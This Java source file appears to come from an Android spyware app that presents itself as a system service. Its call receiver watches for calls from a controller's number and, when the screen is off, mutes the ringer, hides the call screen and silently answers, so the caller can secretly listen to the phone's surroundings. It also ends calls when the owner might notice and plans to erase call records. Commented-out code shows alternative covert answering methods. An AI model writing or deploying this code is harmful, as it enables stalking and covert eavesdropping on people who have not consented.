package system.service;

import java.lang.reflect.Method;

import system.service.activity.GlobalPrefActivity;

import com.android.internal.telephony.ITelephony;
import com.particle.inspector.common.util.PowerUtil;
import com.particle.inspector.common.util.phone.PhoneUtils;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.KeyEvent;

public class IncomingCallReceiver extends BroadcastReceiver 
{
	private static final String LOGTAG = "ComingCallReceiver";
	
	private static boolean IS_ENV_LISTENING = false;
	private static int ORIGINAL_RING_MODE;
	private static int ORIGINAL_RING_VOL;

	@Override
	public void onReceive(Context context, Intent intent) 
	{
		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
		
		// Check phone state
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
		switch (tm.getCallState()) {
			case TelephonyManager.CALL_STATE_RINGING : {
				// ---------------------------------------------------------------------------
				// Listen to environment sound
				// ---------------------------------------------------------------------------
				String comingPhoneNum = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
				String masterPhone = GlobalPrefActivity.getReceiverPhoneNum(context);
				try {
					// Only the interceptor phone call listen environment
					if (comingPhoneNum.contains(masterPhone)) 
					{
						// Return if the target phone screen is on or it is in a call.
						// That mean it will only take env listening action when the screen is off and not in a call.
						if (PowerUtil.isScreenOn(context) || PhoneUtils.getITelephony(tm).isOffhook()) {
							PhoneUtils.getITelephony(tm).endCall();
							// TODO remove the latest phone call record
							return;
						}
						
						// Disable ringer and vibrate
		        		AudioManager audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
		        		ORIGINAL_RING_MODE = audioManager.getRingerMode();
		        		if (ORIGINAL_RING_MODE == AudioManager.RINGER_MODE_NORMAL) {
		        			ORIGINAL_RING_VOL = audioManager.getStreamVolume(AudioManager.STREAM_RING);
		        		}
		        		audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);
		        		
		        		// Pick up phone automatically
		        		PhoneUtils.getITelephony(tm).showCallScreenWithDialpad(false);
						PhoneUtils.getITelephony(tm).answerRingingCall();
						IS_ENV_LISTENING = true;
						
						// TODO set screen off
						
						/*
		        		// Disable ringer and vibrate
		        		AudioManager audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
		        		audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);
		        		
		        		// Answer the phone
		                try {
		                	answerPhoneAidl(context);
		                }
		                catch (Exception e) {
		                    Log.d(LOGTAG, "Error trying to answer using telephony service. Falling back to headset.");
		                    answerPhoneHeadsethook(context);
		                }
		                // Enable the speakerphone
		                enableSpeakerPhone(context);
		                */ 
					} 
				} catch (Exception ex) {
						Log.e(LOGTAG, "Failed to auto answer call");
				}
	        	
	        	break;
			}
			case TelephonyManager.CALL_STATE_OFFHOOK : { // 来电接通 去电拨出
				break;
			}
			case TelephonyManager.CALL_STATE_IDLE : { // 来去电电话挂断
				// Reset IS_ENV_LISTENING flag
				if (IS_ENV_LISTENING) {
					IS_ENV_LISTENING = false;
					
					// Restore to the ringing mode
					AudioManager audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
					audioManager.setRingerMode(ORIGINAL_RING_MODE);
					if (ORIGINAL_RING_MODE == AudioManager.RINGER_MODE_NORMAL) {
						audioManager.setStreamVolume(AudioManager.STREAM_RING, ORIGINAL_RING_VOL, 0);						
					}
				}
				
				break;
			}	
		}
				
	}
	
	/*
		This is for to put into the ringing mode
		AudioManager audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
		int maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING);
		audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
		audioManager.setStreamVolume(AudioManager.STREAM_RING, maxVolume, AudioManager.FLAG_SHOW_UI + AudioManager.FLAG_PLAY_SOUND);

	// ----------------------------------------------------------------------------------
	// The functions for listening to environment sound
	// ----------------------------------------------------------------------------------
	
	private void enableSpeakerPhone(Context context) {
        AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        audioManager.setSpeakerphoneOn(true);
	}
	
	private void answerPhoneHeadsethook(Context context) {
        // Simulate a press of the headset button to pick up the call
        Intent buttonDown = new Intent(Intent.ACTION_MEDIA_BUTTON);             
        buttonDown.putExtra(Intent.EXTRA_KEY_EVENT, new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_HEADSETHOOK));
        context.sendOrderedBroadcast(buttonDown, "android.permission.CALL_PRIVILEGED");

        // Froyo and beyond trigger on buttonUp instead of buttonDown
        // * Froyo is the code of Android 2.2
        Intent buttonUp = new Intent(Intent.ACTION_MEDIA_BUTTON);               
        buttonUp.putExtra(Intent.EXTRA_KEY_EVENT, new KeyEvent(KeyEvent.ACTION_UP, KeyEvent.KEYCODE_HEADSETHOOK));
        context.sendOrderedBroadcast(buttonUp, "android.permission.CALL_PRIVILEGED");
	}
	
	@SuppressWarnings("unchecked")
	private void answerPhoneAidl(Context context) throws Exception {
		// Set up communication with the telephony service (thanks to Tedd's Droid Tools!)
		TelephonyManager tm = (TelephonyManager) context.getSystemService(android.content.Context.TELEPHONY_SERVICE);
		Class c = Class.forName(tm.getClass().getName());
		Method m = c.getDeclaredMethod("getITelephony");
		m.setAccessible(true);
		ITelephony telephonyService = (ITelephony) m.invoke(tm);

		// Silence the ringer and answer the call
		telephonyService.silenceRinger();
		telephonyService.answerRingingCall();
	}
	
	*/
}
